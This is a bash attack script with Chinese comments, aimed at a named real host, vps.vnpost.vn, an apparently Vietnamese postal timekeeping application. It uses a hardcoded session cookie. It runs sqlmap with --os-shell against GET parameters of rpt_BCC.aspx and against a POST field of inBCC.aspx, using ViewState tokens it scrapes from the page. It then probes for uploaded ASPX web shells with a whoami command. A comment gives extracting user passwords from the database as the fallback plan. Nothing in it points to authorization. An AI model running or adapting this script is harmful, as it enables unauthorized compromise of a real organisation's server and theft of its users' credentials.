#!/bin/bash

SESSION="lswqd4itz5u4ftzm3jcmjfio"

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔥 策略1: 测试rpt_BCC.aspx的其他GET参数"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

TARGET="http://vps.vnpost.vn/chamcong/report/rpt_BCC.aspx?kyluong=112025&MA_DV=KVMB&MA_BP=TC&MA_TO=VP"

echo "  测试所有参数（包括MA_DV, MA_BP, MA_TO）..."
echo ""

# 强制测试所有参数
python3 /tmp/sqlmap/sqlmap.py \
    -u "$TARGET" \
    --cookie="ASP.NET_SessionId=$SESSION" \
    --batch \
    --threads=1 \
    --delay=1 \
    --level=3 \
    --risk=2 \
    -p "kyluong,MA_DV,MA_BP,MA_TO" \
    --technique=BEUST \
    --dbms=mssql \
    --os-shell \
    -v 0 \
    2>&1 | tee sqlmap_all_params.txt

echo ""
echo "  结果:"
tail -50 sqlmap_all_params.txt

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔥 策略2: 测试inBCC.aspx的POST参数（我们知道这里堆叠查询可用）"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# 获取ViewState
BASE="http://vps.vnpost.vn/chamcong"
page=$(curl -sk "${BASE}/report/inBCC.aspx?ID=BC01" -H "Cookie: ASP.NET_SessionId=$SESSION" 2>&1)
VS=$(echo "$page" | grep -oE '__VIEWSTATE" value="[^"]+' | cut -d'"' -f3)
VG=$(echo "$page" | grep -oE '__VIEWSTATEGENERATOR" value="[^"]+' | cut -d'"' -f3)
EV=$(echo "$page" | grep -oE '__EVENTVALIDATION" value="[^"]+' | cut -d'"' -f3)

echo "  ViewState获取成功"
echo ""

# 创建POST请求文件
cat > post_request.txt << POSTREQ
POST /chamcong/report/inBCC.aspx?ID=BC01 HTTP/1.1
Host: vps.vnpost.vn
Cookie: ASP.NET_SessionId=$SESSION
Content-Type: application/x-www-form-urlencoded

__VIEWSTATE=${VS}&__VIEWSTATEGENERATOR=${VG}&__EVENTVALIDATION=${EV}&txtThang=11&txtNam=2025&btnExport=Export
POSTREQ

echo "  POST请求文件创建完成"
echo ""

# sqlmap测试POST参数
echo "  sqlmap测试txtThang参数..."

python3 /tmp/sqlmap/sqlmap.py \
    -r post_request.txt \
    --batch \
    --threads=1 \
    --delay=1 \
    --level=2 \
    --risk=2 \
    -p "txtThang" \
    --technique=BEUST \
    --dbms=mssql \
    --os-shell \
    -v 0 \
    2>&1 | tee sqlmap_post_txtthang.txt

echo ""
echo "  结果:"
tail -50 sqlmap_post_txtthang.txt

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "✅ 测试完成"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# 检查是否GetShell成功
if grep -qi "os-shell>" sqlmap_all_params.txt sqlmap_post_txtthang.txt; then
    echo ""
    echo "🔥🔥🔥🔥🔥 GetShell成功！"
elif grep -qi "uploaded\|written" sqlmap_all_params.txt sqlmap_post_txtthang.txt; then
    echo ""
    echo "🔥 WebShell可能上传成功，测试中..."
    
    for shell in sqlmap_shell.aspx tmpb.aspx; do
        resp=$(curl -sk "http://vps.vnpost.vn/chamcong/$shell?cmd=whoami" 2>&1)
        if echo "$resp" | grep -qiE "nt authority|iis"; then
            echo "  ✅ http://vps.vnpost.vn/chamcong/$shell"
        fi
    done
else
    echo ""
    echo "⚠️  仍未GetShell"
    echo ""
    echo "最后方案：提取数据库敏感数据（用户密码）"
fi
